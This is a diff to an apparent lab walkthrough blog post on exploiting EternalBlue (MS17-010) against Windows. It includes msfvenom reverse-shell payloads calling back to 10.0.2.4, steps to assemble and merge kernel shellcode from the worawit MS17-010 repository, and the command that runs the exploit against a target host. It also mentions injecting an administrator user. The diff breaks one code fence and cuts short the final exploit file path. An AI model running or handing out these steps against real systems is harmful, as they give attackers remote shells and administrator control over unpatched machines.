@@ -84,8 +84,7 @@ Then we will connect to the Driver C so we can egn our modification there. This 
 Finaly we will close the connection.
 <h3> Upload shell</h3>
 Let's create our reverse shell first:
-```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 -f exe > shell-x86.exe```
-Then modify the code so it will upload and run our exploit
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 -f exe > shell-x86.exeThen modify the code so it will upload and run our exploit
 ```
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
@@ -126,5 +125,31 @@ Let's execute psexec from our impacket to connect to the machine as an administr
 [psexec](/img/EternalBlue/psexec.PNG)
 <br>
 
-
-link[@WarMarx](https://twitter.com/\_WarMarX\_) 
+<h3> Without Pipe or credentials </h3>
+We looked at various ways to exploit eternal blue with pipename. But what if whe have no pipename. We need a way to still exploit it. We have one but it is more likely to crash the target. 
+To make this work, first we need to clone the full repo of MS17-010 from worawit. 
+```git clone https://github.com/worawit/MS17-010.git
+cd MS17-010/
+```
+We will focus on the shellcode first. going into the folder shellcode and reading the file eternalblue_sc_merge.py we can get an idea how to create our shell code and use with this exploit. 
+First we need to assemblée the shell code
+```nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin```
+Then we need to create our payload, but this time in raw format. Lest use the same shell, create two version of them like in the exploit code.
+```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=445 -f raw -o sc_x86_msf.bin EXITFUNC=thread
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=445 -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread
+```
+We will create our exploit in raw format and adding exitfunction to try to make a clean exit and minimalise the chance of crash.
+Now we need to combine our payloads with the created shellcode then merge them.
+```cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
+cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
+python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin```
+We now have our exploit binary. all we have to do is to execute the exploit and wait for our shell.
+Goind back one folder and executing eternal blue
+```
+cd ..
+python eternalblue_exploit7.py 10.0.2.15 ./shellcode/sc_all.
+```
+[withoutPipe](/img/EternalBlue/final.PNG)
+<h2>Summery:</h2>
+We looked at multiple ways to exploit eternalBlue with and without pipename. We created reverse shells and injected our own administrator user.
